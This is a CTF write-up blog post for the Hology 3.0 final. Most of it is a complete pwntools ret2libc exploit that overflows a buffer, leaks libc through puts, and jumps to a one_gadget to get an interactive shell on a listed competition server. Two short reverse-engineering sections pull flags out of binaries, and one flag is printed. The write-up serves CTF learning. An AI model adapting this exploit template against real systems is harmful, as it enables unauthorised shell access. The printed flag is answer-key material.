---
layout: post
title:  "Writeup Hology 3.0 CTF Final"
date:   2020-11-26
categories: ctf
description: Writeup Hology 3.0 CTF Final
tags: ctf-writeup
---

<img src="/images/hology3/banner.png"/>

my team glut0r is qualifed to the final round this year, and this is my write up for some challenge

<ul>
    <li><h3>Pwn</h3></li>
    <li><a href="#hello">Hello</a></li>
    <li><h3>Rev</h3></li>
    <li><a href="#n0t">n0t so long</a></li>
    <li><a href="#phone">phone</a></li>
<ul>

<h1 id="hello">Hello | pwn</h1>

this is a simple ret2libc attack
leak libc function, calculate to `system()` and `/bin/sh`

my exploit:

{% highlight python %}
#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="debug",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/hology3-final/pwn/hello/hallo")
elf = ELF(TARGET)
libc= ELF("./libc.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
def exploit(r):
    attach(r)
    puts_got = elf.got['puts']
    pop_rdi = 0x0000000000400733
    puts = 0x000000000400520
    main = 0x0000000000400637
    ret = 0x0000000000400506
    p = "A" * 71
    p += ">"
    p += p64(pop_rdi)
    p += p64(puts_got)
    p += p64(puts)
    p += p64(main)
    r.sendlineafter(":",p)
    r.recvuntil(">")
    leak = u64(r.recv().split()[1].ljust(8, "\x00"))
    log.info("leak: " + hex(leak))
    base = leak  - libc.sym['puts'] 
    syst = libc.sym['system'] + base 
    binsh = libc.search("/bin/sh").next()
    one = 0x10a41c + base
    info(hex(syst))

    p = "A" * 72
    # p += p64(pop_rdi)
    # p += p64(binsh)
    # p += p64(syst)
    # p += p64(syst)
    p += p64(one)
    r.sendline(p)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("95.111.192.17", 31337)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

{% endhighlight %}

<h1 id="n0t">n0t so long | Rev</h1>

the flag is already in the binary file, so we can just collect all the string using ida

<img src="/images/hology3/ps.png"/>
flag: 1nput_d035nt_p4s5_m4x_int39er

<h1 id="phone">Phone | Rev</h1>

we can solve this challenge with the same approaches to the previous challenge, first i found this function


<img src="/images/hology3/us.png"/>

looks like this function will print out an `_` string, so this is the part of the flag, now we can just xref 
this function

<img src="/images/hology3/xref.png"/>

now we can just collect all the string from xref or we can use gdb to jump to the first function that print the flag